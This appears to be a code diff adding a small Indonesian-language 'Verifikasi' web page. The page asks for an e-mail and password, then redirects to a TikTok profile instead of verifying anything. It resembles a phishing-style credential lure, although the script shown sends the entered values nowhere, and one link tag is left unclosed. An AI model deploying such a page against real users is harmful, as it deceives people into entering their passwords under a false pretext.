@@ -1,0 +1,41 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Verifikasi</title>
+    <link rel="stylesheet" href="styles.css">
+    <link rel="server"
+</head>
+<body style="background-color: black;">
+    <div class="login-box">
+        <div style="text-align: center;">
+            <h2>Verifikasi</h2>
+            <form id="verificationForm" action="/login" method="post">
+                <div class="textbox">
+                    <input type="text" id="email" name="email" placeholder="E-mail" required>
+                </div>
+                <div class="textbox">
+                    <input type="password" id="password" name="password" placeholder="Password" required>
+                </div>
+                <button type="submit" class="btn">Verifikasi</button>
+            </form>
+        </div>
+    </div>
+    <script>
+        document.getElementById('verificationForm').addEventListener('submit', function(event) {
+            event.preventDefault();
+            const email = document.getElementById('email').value;
+            const password = document.getElementById('password').value;
+
+            // Proses verifikasi
+            if (email && password) {
+                // Jika berhasil, buka link yang diberikan
+                window.location.href = 'https://www.tiktok.com/@bocah_dari_cikarang?_t=8qsokOAjSWW&_r=1';
+            } else {
+                alert('Mohon isi semua kolom.');
+            }
+        });
+    </script>
+</body>
+</html>
